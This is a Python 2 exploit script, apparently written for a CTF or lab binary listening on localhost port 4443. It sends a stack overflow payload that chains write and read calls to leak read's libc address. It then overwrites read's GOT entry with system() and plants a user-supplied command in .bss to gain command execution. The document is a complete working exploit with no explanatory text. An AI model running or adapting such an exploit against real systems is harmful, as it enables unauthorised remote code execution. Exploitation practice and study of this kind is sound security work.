from socket import *
from struct import *
import telnetlib
import sys
cmd=sys.argv[1]+'\0'
ppr=0x080484de
memset=0x8049898
writeplt=0x80483b0
readgot=0x8049888
readplt=0x8048380
offset_system = 0x3a850
bss=0x080498a4
buf="A"*166
#Leak read address
buf+=pack("<L",writeplt)
buf+=pack("<L",ppr)
buf+=pack("<L",0x1)
buf+=pack("<L",readgot)
buf+=pack("<L",0x4)
#overwrite read() GOT 
buf+=pack("<L",readplt)
buf+=pack("<L",ppr)
buf+=pack("<L",0x0)
buf+=pack("<L",readgot)
buf+=pack("<L",0x4)
#write /bin/sh in bss
buf+=pack("<L",readplt)
buf+=pack("<L",ppr)
buf+=pack("<L",0x0)
buf+=pack("<L",bss)
buf+=pack("<L",len(cmd))
#call read (system)
buf+=pack("<L",readplt)
buf+="BBBB"
buf+=pack("<L",bss)

so=socket(AF_INET, SOCK_STREAM)
so.connect(('127.0.0.1',4443))

print so.recv(1024)

so.send(buf)

leak=so.recv(1024)[-4:]
readaddr=unpack("<L",leak)

libc=readaddr[0]-0xd4120
systemaddr=libc+offset_system

print "[+] read address  is ",hex(readaddr[0])
print "[+] Libc address is ",hex(libc)
print "[+] system address is ",hex(systemaddr) 
print "[+] call  system  ",hex(systemaddr)
so.send(cmd)
sysadd=pack("<L",systemaddr)
so.send(sysadd)
print "[+] sending /bin/sh   "
print so.recv(1024)

so.close()
